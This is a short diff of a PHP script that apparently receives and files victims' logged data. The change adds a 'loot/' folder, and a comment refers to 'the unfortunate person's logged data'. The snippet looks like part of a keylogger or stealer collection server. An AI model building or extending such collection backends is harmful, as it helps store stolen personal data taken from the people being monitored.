@@ -48,8 +48,10 @@ $username = $_GET["username"];
 $uploadtype = $_GET["type"];
 /// Today's date.
 $date = date("Y-m-d");
+/// Folder to put everything.
+$pillagefolder = "loot/";
 /// A folder dedicated for storing the unfortunate person's logged data.
-$userfolder = $date . "/" . FilterFilename($username);
+$userfolder = $pillagefolder . $date . "/" . FilterFilename($username);
 /// Check if the current date's folder exist. If not create it.
 CheckFolder($userfolder);
 
